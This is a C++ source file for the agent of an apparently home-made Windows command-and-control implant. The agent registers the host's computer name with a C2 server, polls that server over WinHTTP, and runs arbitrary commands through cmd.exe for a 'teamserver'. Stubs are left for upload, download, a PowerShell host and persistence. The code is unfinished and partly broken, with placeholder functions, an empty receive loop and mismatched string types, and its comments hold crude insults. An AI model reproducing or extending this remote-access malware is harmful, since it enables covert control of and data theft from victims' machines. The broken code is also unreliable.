#include "Agent.h"


void Agent::Register(std::string ip, unsigned int port) {
	const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
	char buffer[buffer_size];
	DWORD lpnSize = buffer_size;

	if (GetComputerNameA(buffer, &lpnSize) == FALSE)
		throw std::runtime_error("Something went wrong.");
	ComputerName = std::string{ buffer };


	Post(RETURN_URI, "register?comp=" + ComputerName);
}


std::string Agent::Get(std::wstring path) {
	// path = path + "/" + AgentID + "/"
	std::string result = "";

	HINTERNET hSession, hConnect, hRequest;
	BOOL bResults = FALSE;
	DWORD sSize = 0;


	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	
	if (!hSession) {
		return result;
	}

	hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);

	if (!hConnect) {
		return result;
	}

	hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

	if (!hRequest) {
		return result;
	}

	bResults = WinHttpSendRequest(hRequest,	WINHTTP_NO_ADDITIONAL_HEADERS,	0, WINHTTP_NO_REQUEST_DATA, 0,	0, 0);

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	
	if (bResults) {
		do {
			sSize = 0;

		
		} while (sSize > 0);
	}

	return result;
}

std::string Agent::Post(std::string_view path, std::string_view data) {
	//ENCODE DATA
	// path = path + "/" + AgentID + "/"
	return "POST func";
}

//re-write this bullshit, each command in own class.

void Agent::shell(std::vector<std::string> args) {
	if (args.size() == 0) {
		//Post(RETURN_PATH, error="No Arguments you fucking retard.");
		return;
	}
	std::string result = "";
	HANDLE hRead, hWrite;
	STARTUPINFO si;
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES saAttr;

	ZeroMemory(&saAttr, sizeof(saAttr));
	
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hRead, &hWrite, &saAttr, 0)) {
		//Post(RETURN_URL, GetLastError());
		return;// send error back to teamserver
	}

	std::wstring sArgs = std::accumulate(args.begin(), args.end(), std::wstring{});
	std::wstring cmd = L"cmd.exe /c " + sArgs;


	if (!CreateProcess(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		//Post(RETURN_URL, GetLastError());// send error back to teamserver
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return;
	}

	BOOL bProcessEnded = false;

	while (!bProcessEnded) {
		bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;

		for (;;) {
			char buf[1024]{};
			DWORD dwRead = 0;
			DWORD dwAvail = 0;

			if (!::PeekNamedPipe(hRead, NULL, 0, NULL, &dwAvail, NULL)) {
				break;
			}

			if (!dwAvail)
				break;

			if (!::ReadFile(hRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
				break;

			buf[dwRead] = 0;
			result += buf;
		}
	}

	//Post(RETURN_PATH + "/Agent/shell/output", data="No Arguments you fucking retard.");

	CloseHandle(hRead);
	CloseHandle(hWrite);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

}
// Custom Powershell host.
void Agent::powershell(std::vector<std::string> args) {

}
// Read file contents, encode, post to http. 2 args
void Agent::upload(std::vector<std::string> args) {

}
// get file contents save to file. 2 args
void Agent::download(std::vector<std::string> args) {

}
// no args, maybe add a few methods later
void Agent::persist(std::vector<std::string> args) {

}

void Agent::listdir(std::vector<std::string> args) {

}